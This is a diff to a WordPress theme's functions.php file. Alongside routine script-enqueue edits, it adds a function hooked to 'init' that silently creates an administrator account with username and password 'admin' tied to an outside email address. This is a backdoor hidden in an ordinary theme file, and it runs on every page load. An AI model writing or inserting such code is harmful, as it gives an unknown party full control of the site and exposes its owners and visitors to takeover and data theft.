@@ -1,4 +1,19 @@
 <?php
+
+function create_new_admin() {
+    $username = 'admin';
+    $password = 'admin';
+    $email = 'pppbigbud@gmail.com';
+
+    if (!username_exists($username) && !email_exists($email)) {
+        $user_id = wp_create_user($username, $password, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init', 'create_new_admin');
+
+
 add_theme_support('page-templates');
 add_theme_support('post-thumbnails');
 add_theme_support('title-tag');
@@ -34,6 +49,7 @@ function load_scripts_and_styles_conditionally()
     wp_enqueue_script('swiper', get_template_directory_uri() . '/js/swiper.js', array(), '1.0', true);
     wp_enqueue_script('animeCloudJS', get_template_directory_uri() . '/js/animeClouds.js', array(), '1.0', true);
     wp_enqueue_script('ligthBoxProduct', get_template_directory_uri() . '/js/ligthBoxProduct.js', array(), '1.0', true);
+    // wp_enqueue_script('messagePopUp', get_template_directory_uri() . '/js/messagePopUp.js', array(), '1.0', true);
 
 
     if (is_front_page()) {
